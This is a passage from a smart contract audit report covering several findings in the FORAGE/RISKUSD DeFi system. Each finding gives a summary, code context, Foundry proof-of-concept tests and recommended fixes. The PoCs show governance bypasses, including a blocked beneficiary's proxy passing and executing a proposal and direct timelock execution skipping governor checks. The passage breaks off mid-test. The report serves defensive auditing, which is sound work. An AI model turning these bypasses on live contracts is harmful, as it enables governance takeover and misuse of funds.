    IRISKUSDVaultCustodyPort(riskusdVault).deployCapital(usdcE6);
    ...
}

function returnPrincipalUSDC(uint256 amount) external nonReentrant {
    _requireExecutor();
    ...
}

function returnPnLUSDC(uint256 vaultId, uint256 amount) external nonReentrant {
    _requireExecutor();
    ...
}

function requestWithdrawalIntent(...) external nonReentrant returns (bytes32 intentId) {
    _requireExecutor();
    ...
}
```

#### Proof of Concept

Add a regression test that finalizes a same-bridge `CustodianRegistry` config with a new executor, then verify:
- `view_.executor` becomes the new executor and the old `ROLE_EXECUTOR` is revoked in the registry.
- `bridge.custodianExecutor()` still returns the old executor.
- `oldExecutor` still succeeds on `deployToHyperLiquid`, while `newExecutor` reverts with `UnauthorizedExecutor`.
- after `blocklist.blockAddress(executor)`, the stale executor is blocked on later bridge calls.

##### same-bridge executor rotation PoC

Path: `test/hyperliquid/POC_HLTradingBridgeExecutorRotation_836c3211.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./HLTradingBridge.target.t.sol";

/**
 * @title POC: Registry executor rotation diverges from live bridge authorization
 * @notice Proof Statement: Prove that finalizing a same-bridge `CustodianRegistry` config with a new executor
 * updates the registry's executor metadata and `ROLE_EXECUTOR` mapping, but does not rotate
 * `HLTradingBridge._custodianExecutor`. The old executor can still deploy through the live bridge while the new
 * executor is rejected. Also prove that the already-wired blocklist can immediately contain the stale executor,
 * which materially limits the report's claimed emergency-impact severity.
 */
contract POC_HLTradingBridgeExecutorRotation_836c3211 is HLTradingBridge_TargetCustody {
    function test_registryExecutorRotationDivergesButBlocklistContains() public {
        bytes32 id = custodianRegistry.HYPERLIQUID_CUSTODIAN_ID();
        address newExecutor = makeAddr("new-executor");

        CustodianRegistry.CustodianConfig memory rotated =
            custodianRegistry.hyperLiquidLaunchConfig(address(bridge), newExecutor, 421_614, sourceAccount, 10_000_000e6);

        vm.startPrank(owner);
        custodianRegistry.proposeCustodianConfig(rotated);
        vm.warp(block.timestamp + custodianRegistry.FINALIZE_DELAY() + 1);
        custodianRegistry.finalizeCustodianConfig(id);
        vm.stopPrank();

        CustodianRegistry.CustodianView memory view_ = custodianRegistry.getCustodian(id);
        assertEq(view_.executor, newExecutor, "registry executor must rotate");
        assertFalse(
            custodianRegistry.hasCustodianRole(id, custodianRegistry.ROLE_EXECUTOR(), executor),
            "old executor role must be revoked in registry"
        );
        assertTrue(
            custodianRegistry.hasCustodianRole(id, custodianRegistry.ROLE_EXECUTOR(), newExecutor),
            "new executor role must be granted in registry"
        );
        assertEq(bridge.custodianExecutor(), executor, "bridge must still trust the old executor");

        vm.prank(executor);
        bridge.deployToHyperLiquid(1_000e6);
        assertEq(custodianRegistry.deployedByCustodian(id), 1_000e6, "old executor still deploys through the bridge");

        vm.prank(newExecutor);
        vm.expectRevert(HLTradingBridge.UnauthorizedExecutor.selector);
        bridge.deployToHyperLiquid(1_000e6);

        vm.prank(blocklistGuardian);
        blocklist.blockAddress(executor);

        vm.prank(executor);
        vm.expectRevert(abi.encodeWithSelector(HLTradingBridge.BlockedAddress.selector, executor));
        bridge.requestWithdrawalIntent(100e6, address(bridge), sourceAccount, WITHDRAWAL_CHAIN_SELECTOR);
    }
}
```

#### Recommendation

Make the bridge consume the registry as the live authority source before every privileged executor action, or add a two-step bridge-side executor rotation that is atomically coupled to the registry update.

A minimal safe pattern is:

```solidity
function _requireExecutor() internal view {
    bytes32 id = ICustodianRegistryAccountingPort(custodianRegistry).HYPERLIQUID_CUSTODIAN_ID();
    if (!ICustodianRegistryRolePort(custodianRegistry).hasCustodianRole(id, ROLE_EXECUTOR, msg.sender)) {
        revert UnauthorizedExecutor();
    }
}
```

If a cached bridge-side executor must remain for gas reasons, the registry finalizer and bridge executor finalizer need to be part of one atomic governance sequence and must fail unless both complete together.

#### Assumptions

- [x] Governance uses the onchain registry role/config flow to rotate a compromised executor while keeping the same bridge address live.
- [x] The stale executor key is the one governance intends to revoke, so the old address is not supposed to retain custody authority.
- [x] The bridge still has its accountant role in the same-bridge case, so registry accounting continues to accept bridge-originated deploy calls.

#### Predicted Invalid Reasons

- The registry role is bookkeeping only; the real live executor lives on the bridge.

<a id="finding-open-91"></a>
### OPEN-91 — Partnership vesting wallets never inherit the shared blocklist, letting blocked beneficiaries re-delegate up to 40M FORAGE

#### Summary

`FORAGETreasury.distributePartnership()` deploys `DelegatingVestingWallet` instances with `tokenSetter_ = address(this)` but never wires the child to the shared blocklist. After `setForageToken()` burns `_tokenSetter`, the wallet stays at `blocklist == address(0)`, so a later-blocked beneficiary can still call `delegateVotingPower()` and redirect `40_000_000 FORAGE` of partnership voting power to an unblocked proxy.

#### Context Files

##### FORAGETreasury.distributePartnership()

Path: `src/FORAGETreasury.sol`
Highlight lines: 1

```solidity
function distributePartnership(
    address beneficiary,
    address delegatee,
    uint256 amount,
    uint64 start,
    uint64 duration,
    uint64 cliff
) external onlyOwner nonReentrant returns (address wallet) {
    if (_isBlocked(beneficiary) || _isBlocked(delegatee)) revert BlockedRecipient();

    wallet = address(new DelegatingVestingWallet(beneficiary, start, duration, cliff, address(this)));
    DelegatingVestingWallet(wallet).setInitialDelegatee(delegatee);
    _forageToken.safeTransfer(wallet, amount);
    DelegatingVestingWallet(wallet).precommitForageToken(address(_forageToken));
    DelegatingVestingWallet(wallet).setForageToken(address(_forageToken));
    totalPartnershipDistributed += amount;
}
```

##### DelegatingVestingWallet.setBlocklist() / replaceBrokenBlocklist()

Path: `src/DelegatingVestingWallet.sol`
Highlight lines: 1

```solidity
function setBlocklist(address blocklist_) external {
    if (msg.sender != _tokenSetter && msg.sender != _blocklistSetter) {
        revert UnauthorizedTokenSetter(msg.sender);
    }
    if (_blocklist != address(0)) revert BlocklistAlreadySet();
    _blocklist = blocklist_;
}

function replaceBrokenBlocklist(address blocklist_) external {
    if (msg.sender != _tokenSetter && msg.sender != _blocklistSetter) {
        revert UnauthorizedTokenSetter(msg.sender);
    }
    ...
}
```

##### DelegatingVestingWallet.setForageToken()

Path: `src/DelegatingVestingWallet.sol`
Highlight lines: 1

```solidity
function setForageToken(address forageToken_) external {
    if (msg.sender != _tokenSetter) revert UnauthorizedTokenSetter(msg.sender);
    ...
    _forageToken = forageToken_;
    _tokenSetter = address(0);
    _callDelegate(_delegatee);
}
```

##### DelegatingVestingWallet.delegateVotingPower()

Path: `src/DelegatingVestingWallet.sol`
Highlight lines: 1

```solidity
function delegateVotingPower(address newDelegatee) external {
    if (msg.sender != _beneficiary) revert UnauthorizedBeneficiary(msg.sender);
    _requireNotBlocked(_beneficiary);
    _requireNotBlocked(address(this));
    _requireNotBlocked(newDelegatee);
    _delegatee = newDelegatee;
    _callDelegate(newDelegatee);
}
```

##### DelegatingVestingWallet._requireNotBlocked()

Path: `src/DelegatingVestingWallet.sol`
Highlight lines: 1

```solidity
function _requireNotBlocked(address account) private view {
    address blocklist_ = _blocklist;
    if (blocklist_ != address(0) && IBlocklist(blocklist_).isBlocked(account)) {
        revert BlockedAddress(account);
    }
}
```

##### ForageToken.delegate()

Path: `src/ForageToken.sol`
Highlight lines: 1

```solidity
function delegate(address delegatee) public override {
    address account = _msgSender();
    _requireNotBlocked(account);
    if (delegatee != address(0)) {
        _requireNotBlocked(delegatee);
    }
    super.delegate(delegatee);
}
```

#### Proof of Concept

1. Save the PoC as `test/POC_FORAGETreasury_target_92e81030.t.sol`.
2. Run `forge test --match-path test/POC_FORAGETreasury_target_92e81030.t.sol -vv`.
3. Confirm the partnership wallet keeps `blocklist() == address(0)`, a later-blocklisted beneficiary can still re-delegate votes to a clean proxy, and the proxy can exceed proposal threshold and quorum to execute `ForageGovernor.setMaxActiveProposals(11)`.

##### POC_FORAGETreasury_target_92e81030.t.sol

Path: `test/POC_FORAGETreasury_target_92e81030.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/governance/TimelockController.sol";
import "@openzeppelin/contracts/governance/IGovernor.sol";

import "../src/Blocklist.sol";
import "../src/DelegatingVestingWallet.sol";
import "../src/FORAGETreasury.sol";
import "../src/ForageGovernor.sol";
import "../src/ForageToken.sol";

/**
 * @title POC: Treasury-created partnership wallets stay unwired to the shared blocklist
 * @notice Proof Statement: Prove that `FORAGETreasury.distributePartnership()` creates a
 * blocklist-less `DelegatingVestingWallet`, so a beneficiary who is later blocklisted can still
 * call `delegateVotingPower()` and move the wallet's full voting weight to an unblocked proxy.
 * The proxy then crosses the 1% proposal threshold, supplies the 4% quorum by itself, and
 * executes a governance action, demonstrating post-sanction governance control.
 */
contract POC_FORAGETreasury_target_92e81030 is Test {
    uint256 internal constant PARTNERSHIP_ALLOCATION = 40_000_000e18;
    uint48 internal constant VOTING_DELAY = 0;
    uint32 internal constant VOTING_PERIOD = 3600;
    uint256 internal constant PROPOSAL_THRESHOLD_BPS = 100;
    uint256 internal constant QUORUM_BPS = 400;

    address internal owner = makeAddr("owner");
    address internal guardian = makeAddr("guardian");
    address internal teamVesting = makeAddr("teamVesting");
    address internal beneficiary = makeAddr("beneficiary");
    address internal initialDelegate = makeAddr("initialDelegate");
    address internal proxyDelegate = makeAddr("proxyDelegate");

    Blocklist internal blocklist;
    FORAGETreasury internal treasury;
    ForageToken internal forage;
    ForageGovernor internal governor;
    TimelockController internal timelock;

    function setUp() public {
        vm.warp(100);

        Blocklist blocklistImpl = new Blocklist();
        bytes memory blocklistInit = abi.encodeCall(Blocklist.initialize, (guardian, owner));
        blocklist = Blocklist(address(new ERC1967Proxy(address(blocklistImpl), blocklistInit)));

        ForageToken forageImpl = new ForageToken();
        bytes memory forageInit = abi.encodeCall(ForageToken.initialize, (teamVesting, owner, owner));
        forage = ForageToken(address(new ERC1967Proxy(address(forageImpl), forageInit)));

        FORAGETreasury treasuryImpl = new FORAGETreasury();
        bytes memory treasuryInit = abi.encodeCall(FORAGETreasury.initialize, (address(forage), owner));
        treasury = FORAGETreasury(address(new ERC1967Proxy(address(treasuryImpl), treasuryInit)));

        vm.prank(owner);
        forage.transfer(address(treasury), PARTNERSHIP_ALLOCATION);

        vm.startPrank(owner);
        forage.setBlocklist(address(blocklist));
        treasury.setBlocklist(address(blocklist));
        vm.stopPrank();

        address[] memory proposers = new address[](1);
        proposers[0] = owner;
        address[] memory executors = new address[](1);
        executors[0] = address(0);

        vm.prank(owner);
        timelock = new TimelockController(0, proposers, executors, address(0));

        ForageGovernor governorImpl = new ForageGovernor();
        bytes memory governorInit = abi.encodeCall(
            ForageGovernor.initialize,
            (address(forage), address(timelock), VOTING_DELAY, VOTING_PERIOD, PROPOSAL_THRESHOLD_BPS, QUORUM_BPS, address(0))
        );
        governor = ForageGovernor(payable(address(new ERC1967Proxy(address(governorImpl), governorInit))));

        _grantTimelockRole(keccak256("PROPOSER_ROLE"), address(governor), keccak256("grant_proposer"));
        _grantTimelockRole(keccak256("CANCELLER_ROLE"), address(governor), keccak256("grant_canceller"));
    }

    function test_blockedPartnerStillControlsGovernanceThroughUnwiredWallet() public {
        vm.prank(owner);
        address wallet = treasury.distributePartnership(
            beneficiary,
            initialDelegate,
            PARTNERSHIP_ALLOCATION,
            uint64(block.timestamp + 1 days),
            uint64(4 * 365 days),
            uint64(365 days)
        );

        assertEq(DelegatingVestingWallet(wallet).blocklist(), address(0), "wallet never inherits treasury blocklist");
        assertEq(forage.delegates(wallet), initialDelegate, "wallet starts delegated to the configured delegate");

        vm.prank(guardian);
        blocklist.blockAddress(beneficiary);
        assertTrue(blocklist.isBlocked(beneficiary), "beneficiary must be blocklisted");

        vm.prank(beneficiary);
        DelegatingVestingWallet(wallet).delegateVotingPower(proxyDelegate);

        assertEq(forage.delegates(wallet), proxyDelegate, "blocked beneficiary can still retarget delegation");

        vm.warp(block.timestamp + 1);
        vm.roll(block.number + 1);

        uint256 currentVotes = forage.getVotes(proxyDelegate);
        assertEq(currentVotes, PARTNERSHIP_ALLOCATION, "proxy receives the entire blocked wallet voting weight");
        assertEq(governor.proposalThreshold(), 1_000_000e18, "proposal threshold remains 1% of total supply");
        assertEq(governor.quorum(block.timestamp - 1), 4_000_000e18, "quorum remains 4% of total supply");
        assertGt(currentVotes, governor.proposalThreshold(), "proxy now exceeds the proposal threshold");
        assertGt(currentVotes, governor.quorum(block.timestamp - 1), "proxy now exceeds quorum by itself");

        address[] memory targets = new address[](1);
        targets[0] = address(governor);
        uint256[] memory values = new uint256[](1);
        values[0] = 0;
        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = abi.encodeCall(ForageGovernor.setMaxActiveProposals, (11));
        string memory description = "blocked partner governance bypass";
        bytes32 descriptionHash = keccak256(bytes(description));

        vm.prank(proxyDelegate);
        uint256 proposalId = governor.propose(targets, values, calldatas, description);

        vm.warp(block.timestamp + governor.votingDelay() + 1);
        vm.roll(block.number + 1);

        vm.prank(proxyDelegate);
        governor.castVote(proposalId, 1);

        (, uint256 forVotes,) = governor.proposalVotes(proposalId);
        assertEq(forVotes, PARTNERSHIP_ALLOCATION, "proxy casts the blocked wallet's votes");

        vm.warp(block.timestamp + governor.votingPeriod() + 1);
        vm.roll(block.number + 1);
        assertEq(uint8(governor.state(proposalId)), uint8(IGovernor.ProposalState.Succeeded), "proposal passes");

        assertEq(governor.maxActiveProposals(), 10, "proposal has not executed yet");
        governor.queue(targets, values, calldatas, descriptionHash);
        governor.execute(targets, values, calldatas, descriptionHash);
        assertEq(governor.maxActiveProposals(), 11, "blocked partner's proxy executes governance action");
    }

    function _grantTimelockRole(bytes32 role, address account, bytes32 salt) internal {
        bytes memory data = abi.encodeCall(timelock.grantRole, (role, account));

        vm.prank(owner);
        timelock.schedule(address(timelock), 0, data, bytes32(0), salt, 0);
        timelock.execute(address(timelock), 0, data, bytes32(0), salt);
    }
}

```

##### forge test

Path: `forge test --match-path test/POC_FORAGETreasury_target_92e81030.t.sol -vv`

```bash
forge test --match-path test/POC_FORAGETreasury_target_92e81030.t.sol -vv
```

#### Recommendation

The factory path must wire the child wallet into the shared blocklist before control is irreversibly burned.

Primary fix:

```solidity
wallet = address(new DelegatingVestingWallet(beneficiary, start, duration, cliff, address(this)));
DelegatingVestingWallet(wallet).setInitialDelegatee(delegatee);
DelegatingVestingWallet(wallet).setBlocklist(blocklist);
_forageToken.safeTransfer(wallet, amount);
DelegatingVestingWallet(wallet).precommitForageToken(address(_forageToken));
DelegatingVestingWallet(wallet).setForageToken(address(_forageToken));
```

Alternative fixes:
- Add treasury owner/governance-controlled forwarders for `setBlocklist()` and `replaceBrokenBlocklist()` on child wallets.
- Separate the wallet's token-setting authority from its long-lived blocklist management authority so factories can burn token setup rights without orphaning blocklist control.

Fix checklist:

- [ ] Call `DelegatingVestingWallet(wallet).setBlocklist(blocklist)` immediately after deploying each partnership wallet and before `setForageToken()`.

#### Assumptions

- [x] A partnership wallet was created while the beneficiary was still unblocked.
- [x] The chosen proxy delegate is not itself blocklisted when `delegateVotingPower()` is called.
- [x] Governance remains the control plane for production actions.

#### Predicted Invalid Reasons

- Operators can just block the vesting wallet address too, or later upgrade the treasury to add a forwarder.

<a id="finding-open-95"></a>
### OPEN-95 — Routine guardian-seat rotation never changes the guardian set, leaving compromised guardians active after governance “finalization”

#### Summary

`finalizeRoutineRotation()` only updates `activeSlotHolder[rotation.slot]` and never calls `_replaceGuardianSeat()` for `SLOT_GUARDIAN_SEAT`, so a timelock-finalized guardian-seat rotation can complete while the old guardian remains authorized through `guardianPermissions` and `_guardianList`.

#### Context Files

##### GuardianModule.executeAcceleratedRotation

Path: `openforage_smart_contracts/src/GuardianModule.sol`
Highlight lines: 3, 4, 5

```solidity
function executeAcceleratedRotation(bytes32 operationId) external {
    ...
    activeSlotHolder[rotation.slot] = rotation.successor;
    if (rotation.slot == SLOT_GUARDIAN_SEAT) {
        _replaceGuardianSeat(rotation.current, rotation.successor);
    }
}
```

##### GuardianModule.finalizeRoutineRotation

Path: `openforage_smart_contracts/src/GuardianModule.sol`
Highlight lines: 7

```solidity
function finalizeRoutineRotation(bytes32 operationId) external {
    if (msg.sender != timelock) revert Unauthorized();
    Rotation storage rotation = _rotations[operationId];
    if (!rotation.exists || rotation.executed) revert RotationNotReady();
    if (block.timestamp < rotation.proposedAt + ROUTINE_ROTATION_DELAY) revert FinalizeDelayNotElapsed();
    rotation.executed = true;
    activeSlotHolder[rotation.slot] = rotation.successor;
}
```

##### GuardianModule._replaceGuardianSeat

Path: `openforage_smart_contracts/src/GuardianModule.sol`
Highlight lines: 6, 7, 8

```solidity
function _replaceGuardianSeat(address current, address successor) internal {
    uint256 permissions = guardianPermissions[current];
    if (permissions == 0) revert NotGuardian();
    for (uint256 i; i < _guardianList.length;) {
        if (_guardianList[i] == current) {
            _guardianList[i] = successor;
            guardianPermissions[successor] = permissions;
            guardianPermissions[current] = 0;
            ...
        }
    }
}
```

#### Proof of Concept

1. Governance proposes `proposeRoutineRotation(SLOT_GUARDIAN_SEAT, compromisedGuardian, safeSuccessor)`.
2. After `ROUTINE_ROTATION_DELAY`, the timelock calls `finalizeRoutineRotation()`.
3. The contract marks the rotation executed and updates only `activeSlotHolder[SLOT_GUARDIAN_SEAT]`.
4. `guardianPermissions[compromisedGuardian]` remains unchanged and `_guardianList` is not updated, so `safeSuccessor` never becomes a guardian.
5. The compromised guardian still passes `guardianPause`, `guardianCancel`, and `guardianExecuteEmergency`.

##### GuardianModule.executeAcceleratedRotation

Path: `openforage_smart_contracts/src/GuardianModule.sol`

```solidity
function executeAcceleratedRotation(bytes32 operationId) external {
    ...
    activeSlotHolder[rotation.slot] = rotation.successor;
    if (rotation.slot == SLOT_GUARDIAN_SEAT) {
        _replaceGuardianSeat(rotation.current, rotation.successor);
    }
}
```

##### GuardianModule.finalizeRoutineRotation

Path: `openforage_smart_contracts/src/GuardianModule.sol`

```solidity
function finalizeRoutineRotation(bytes32 operationId) external {
    if (msg.sender != timelock) revert Unauthorized();
    Rotation storage rotation = _rotations[operationId];
    if (!rotation.exists || rotation.executed) revert RotationNotReady();
    if (block.timestamp < rotation.proposedAt + ROUTINE_ROTATION_DELAY) revert FinalizeDelayNotElapsed();
    rotation.executed = true;
    activeSlotHolder[rotation.slot] = rotation.successor;
}
```

##### GuardianModule._replaceGuardianSeat

Path: `openforage_smart_contracts/src/GuardianModule.sol`

```solidity
function _replaceGuardianSeat(address current, address successor) internal {
    uint256 permissions = guardianPermissions[current];
    if (permissions == 0) revert NotGuardian();
    for (uint256 i; i < _guardianList.length;) {
        if (_guardianList[i] == current) {
            _guardianList[i] = successor;
            guardianPermissions[successor] = permissions;
            guardianPermissions[current] = 0;
            ...
        }
    }
}
```

#### Recommendation

Mirror the accelerated-path guardian-seat handling inside `finalizeRoutineRotation()`.

```solidity
function finalizeRoutineRotation(bytes32 operationId) external {
    ...
    rotation.executed = true;
    activeSlotHolder[rotation.slot] = rotation.successor;
    if (rotation.slot == SLOT_GUARDIAN_SEAT) {
        _replaceGuardianSeat(rotation.current, rotation.successor);
    }
}
```

If guardian seats are not supposed to use the routine lane, reject `SLOT_GUARDIAN_SEAT` inside `proposeRoutineRotation()` so operators cannot rely on a no-op recovery path.

#### Assumptions

- [x] Governance may call the routine rotation flow for `SLOT_GUARDIAN_SEAT`.
- [x] The rotated-out guardian still controls its key when `finalizeRoutineRotation()` is called.
- [x] No out-of-band upgrade or direct guardian-management transaction runs in the same recovery flow.

#### Predicted Invalid Reasons

- Routine rotation is only intended for custody-like slots; governance should use `setGuardianPermissions()` or `removeGuardian()` for guardians instead.

<a id="finding-open-82"></a>
### OPEN-82 — Genesis wiring never connects `RISKUSD`, `RISKUSDVault`, `StakingQueue`, or `atRISKUSD` to the governor/guardian pause graph

#### Summary

Deployment wiring leaves `RISKUSD`, `RISKUSDVault`, `StakingQueue`, and deployed `atRISKUSD` tiers with `_forageGovernor == address(0)` while `RISKUSD`, `RISKUSDVault`, and `StakingQueue` are still whitelisted for guardian pause. As a result, `GuardianModule.guardianPause()` cannot use the intended fast emergency path on those targets at genesis, and only the slower owner/timelock path remains.

#### Context Files

##### Deploy.s.sol

Path: `script/Deploy.s.sol`
Highlight lines: 1

```solidity
_registerPausableTarget(deployedRiskusd);
_registerPausableTarget(deployedRiskusdVault);
_registerPausableTarget(deployedStakingQueue);
_registerPausableTarget(deployedHLTradingBridge);
_registerPausableTarget(deployedCustodianRegistry);
```

##### GuardianModule.sol

Path: `src/GuardianModule.sol`
Highlight lines: 1

```solidity
function guardianPause(address target) external {
    _requireCurrentGuardianModule();
    if (!_pausableTargets[target]) revert TargetNotWhitelisted(target);
    IEmergencyPausable(target).pause();
}
```

##### RISKUSD.sol

Path: `src/RISKUSD.sol`
Highlight lines: 1

```solidity
function pause() external {
    if (msg.sender != owner() && msg.sender != _forageGovernor && !_isGuardianModule(msg.sender)) {
        revert UnauthorizedPauseControl(msg.sender);
    }
}

function _isGuardianModule(address caller) internal view returns (bool) {
    if (_forageGovernor == address(0) || _forageGovernor.code.length == 0) return false;
    return caller == IForageGovernorPause(_forageGovernor).guardianModule();
}
```

#### Proof of Concept

Run the Foundry PoC in `POC_DeployMainnet_target_5a36fa1c.t.sol` against `DeployMainnet.runDryRunWithPlaceholders()` to show that `forageGovernor()` remains `address(0)` on `RISKUSD`, `RISKUSDVault`, and `StakingQueue`, while `GuardianModule.guardianPause()` still succeeds on `HLTradingBridge` but reverts on the whitelisted core targets. The same setup also shows a guardian cannot call `StakingQueue.shrinkTierDepositCap()`.

##### POC_DeployMainnet_target_5a36fa1c.t.sol

Path: `test/POC_DeployMainnet_target_5a36fa1c.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../script/DeployMainnet.s.sol";
import "../src/GuardianModule.sol";
import "../src/RISKUSD.sol";
import "../src/RISKUSDVault.sol";
import "../src/StakingQueue.sol";
import "../src/hyperliquid/HLTradingBridge.sol";

/**
 * @title POC: Mainnet dry-run leaves core guardian fast-path targets unwired
 * @notice Proof Statement: Proves that the included `DeployMainnet.runDryRunWithPlaceholders()`
 * flow never finalizes `forageGovernor` on `RISKUSD`, `RISKUSDVault`, or `StakingQueue`,
 * even though all three are whitelisted in `GuardianModule`. A real guardian can still pause
 * `HLTradingBridge`, but `guardianPause()` reverts on those three whitelisted core targets
 * because they do not recognize the guardian module without a nonzero `forageGovernor`.
 */
contract POC_DeployMainnet_target_5a36fa1c is Test {
    DeployMainnet internal deployer;
    GuardianModule internal guardianModule;
    RISKUSD internal riskusd;
    RISKUSDVault internal vault;
    StakingQueue internal queue;
    HLTradingBridge internal bridge;

    function setUp() public {
        vm.chainId(42161);

        deployer = new DeployMainnet();
        deployer.runDryRunWithPlaceholders();

        guardianModule = GuardianModule(deployer.deployedGuardianModule());
        riskusd = RISKUSD(deployer.deployedRiskusd());
        vault = RISKUSDVault(deployer.deployedRiskusdVault());
        queue = StakingQueue(deployer.deployedStakingQueue());
        bridge = HLTradingBridge(deployer.deployedHLTradingBridge());
    }

    function test_poc_guardian_pause_graph_is_only_partially_wired() public {
        assertEq(riskusd.forageGovernor(), address(0), "RISKUSD governor should be unset");
        assertEq(vault.forageGovernor(), address(0), "Vault governor should be unset");
        assertEq(queue.forageGovernor(), address(0), "Queue governor should be unset");

        assertTrue(guardianModule.isPausableTarget(address(riskusd)), "RISKUSD is whitelisted");
        assertTrue(guardianModule.isPausableTarget(address(vault)), "Vault is whitelisted");
        assertTrue(guardianModule.isPausableTarget(address(queue)), "Queue is whitelisted");
        assertTrue(guardianModule.isPausableTarget(address(bridge)), "Bridge is whitelisted");

        address guardian = guardianModule.getGuardians()[0];

        vm.prank(guardian);
        guardianModule.guardianPause(address(bridge));
        assertTrue(bridge.paused(), "Bridge pause should succeed");

        vm.prank(guardian);
        vm.expectRevert(abi.encodeWithSelector(RISKUSD.UnauthorizedPauseControl.selector, address(guardianModule)));
        guardianModule.guardianPause(address(riskusd));

        vm.prank(guardian);
        vm.expectRevert(
            abi.encodeWithSelector(RISKUSDVault.UnauthorizedPauseControl.selector, address(guardianModule))
        );
        guardianModule.guardianPause(address(vault));

        vm.prank(guardian);
        vm.expectRevert(abi.encodeWithSignature("OwnableUnauthorizedAccount(address)", address(guardianModule)));
        guardianModule.guardianPause(address(queue));
    }

    function test_poc_queue_guardian_cap_tightening_reverts() public {
        address guardian = guardianModule.getGuardians()[0];
        uint256 currentCap = queue.effectiveTierDepositCap(0);

        assertGt(currentCap, 1, "Queue tier cap should be initialized");

        vm.prank(guardian);
        vm.expectRevert(abi.encodeWithSignature("OwnableUnauthorizedAccount(address)", guardian));
        queue.shrinkTierDepositCap(0, currentCap - 1);
    }
}
```

#### Recommendation

Wire every governor-dependent target before ownership handoff, then finalize those wires before the guardian module is asked to protect them. At minimum, the deploy flow should set and finalize the governor on `RISKUSD`, `RISKUSDVault`, `StakingQueue`, and each `atRISKUSD` tier before registering guardian pause targets.

```solidity
RISKUSD(deployedRiskusd).setForageGovernor(deployedForageGovernor);
RISKUSDVault(deployedRiskusdVault).setForageGovernor(deployedForageGovernor);
StakingQueue(deployedStakingQueue).setForageGovernor(deployedForageGovernor);
atRISKUSD(deployedAtRiskTier0).setForageGovernor(deployedForageGovernor);
// ... finalize each delayed handoff before guardian registration/handoff
```

Fix checklist:

- [ ] Set and finalize `forageGovernor` on `RISKUSD`, `RISKUSDVault`, `StakingQueue`, and each deployed `atRISKUSD` tier.
- [ ] Move `_registerPausableTarget(...)` calls until after the protected contracts can resolve the deployed `GuardianModule`.
- [ ] Add deployment-time assertions that every governor-dependent target reports a nonzero `forageGovernor()` before go-live.

#### Assumptions

- [x] `RISKUSD`, `RISKUSDVault`, `StakingQueue`, and the deployed `atRISKUSD` tiers are intended to share the same governor/guardian emergency control plane.
- [x] No out-of-band post-deploy procedure outside the provided snapshot completes `setForageGovernor()` / `finalizeForageGovernor()` before the system is declared live.

#### Predicted Invalid Reasons

- The timelock still owns those contracts, so governance can always pause or reconfigure these contracts.
- The guardian path is just an extra convenience.

<a id="finding-open-86"></a>
### OPEN-86 — One directly executed proposal can schedule and execute arbitrary unscheduled payloads in the same transaction

#### Summary

An approved proposal can still be executed directly through `timelock.executeBatch(...)` because the timelock executor role is open. That direct path bypasses `ForageGovernor`'s execute-time checks, so a ready batch can self-grant `PROPOSER_ROLE`, set the delay to `0`, schedule a nested batch, and execute it in the same transaction. The nested calldata is already embedded in the voted proposal bytes, so this is a timelock-guard bypass and review-window compression issue, not a hidden post-vote payload injection primitive.

#### Context Files

##### Deploy timelock executor configuration

Path: `script/Deploy.s.sol`
Highlight lines: 370

```solidity
executors[0] = deployer;
executors[1] = address(0);
deployedTimelock = address(new TimelockController(_minDelay(), proposers, executors, deployer));
```

##### TimelockController.executeBatch

Path: `lib/openzeppelin-contracts-upgradeable/lib/openzeppelin-contracts/contracts/governance/TimelockController.sol`
Highlight lines: 383

```solidity
function executeBatch(...) public payable virtual onlyRoleOrOpenRole(EXECUTOR_ROLE) {
    bytes32 id = hashOperationBatch(targets, values, payloads, predecessor, salt);
    _beforeCall(id, predecessor);
    for (uint256 i = 0; i < targets.length; ++i) {
        _execute(targets[i], values[i], payloads[i]);
    }
    _afterCall(id);
}
```

##### TimelockController.scheduleBatch

Path: `lib/openzeppelin-contracts-upgradeable/lib/openzeppelin-contracts/contracts/governance/TimelockController.sol`
Highlight lines: 289

```solidity
function scheduleBatch(...) public virtual onlyRole(PROPOSER_ROLE) {
    bytes32 id = hashOperationBatch(targets, values, payloads, predecessor, salt);
    _schedule(id, delay);
}
```

##### TimelockController._schedule

Path: `lib/openzeppelin-contracts-upgradeable/lib/openzeppelin-contracts/contracts/governance/TimelockController.sol`
Highlight lines: 314

```solidity
function _schedule(bytes32 id, uint256 delay) private {
    uint256 minDelay = getMinDelay();
    if (delay < minDelay) {
        revert TimelockInsufficientDelay(delay, minDelay);
    }
    $._timestamps[id] = block.timestamp + delay;
}
```

##### TimelockController._beforeCall

Path: `lib/openzeppelin-contracts-upgradeable/lib/openzeppelin-contracts/contracts/governance/TimelockController.sol`
Highlight lines: 205

```solidity
function _beforeCall(bytes32 id, bytes32 predecessor) private view {
    if (!isOperationReady(id)) {
        revert TimelockUnexpectedOperationState(id, _encodeStateBitmap(OperationState.Ready));
    }
    ...
}
```

#### Proof of Concept

Run the PoC test, confirm `governor.execute(...)` reverts on `updateDelay(0)`, then confirm the same queued proposal succeeds through direct `timelock.executeBatch(...)` and executes the nested batch in the same transaction. A second test shows that changing the nested calldata after queueing changes the timelock operation id and the mutated batch remains `Unset`.

##### POC_TimelockDirectExecuteNestedBatch_b5b8cae5.t.sol

Path: `test/audit/cantina_scan4/POC_TimelockDirectExecuteNestedBatch_b5b8cae5.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/governance/TimelockController.sol";

import {ForageGovernor} from "../../../src/ForageGovernor.sol";
import {CantinaScan4RealGovernanceTestBase} from "./CantinaScan4RealGovernanceTestBase.sol";

/**
 * @title POC: Direct timelock execution bypasses ForageGovernor execute-time guards
 * @notice Proof Statement: Proves that a proposal which `governor.execute(...)` correctly rejects
 * can still be executed by calling `timelock.executeBatch(...)` directly after queueing, and that
 * this direct path can self-grant the timelock proposer role, zero the delay, schedule a nested
 * batch, and execute that nested batch in the same transaction.
 *
 * The test deliberately uses a nested `grantRole(CANCELLER_ROLE, attacker)` payload so the impact
 * is easy to assert from protocol state without introducing mocks or custom helper contracts.
 */
contract POC_TimelockDirectExecuteNestedBatch_b5b8cae5 is CantinaScan4RealGovernanceTestBase {
    function test_poc_directExecuteBatchRunsNestedBatchDespiteGovernorGuard() public {
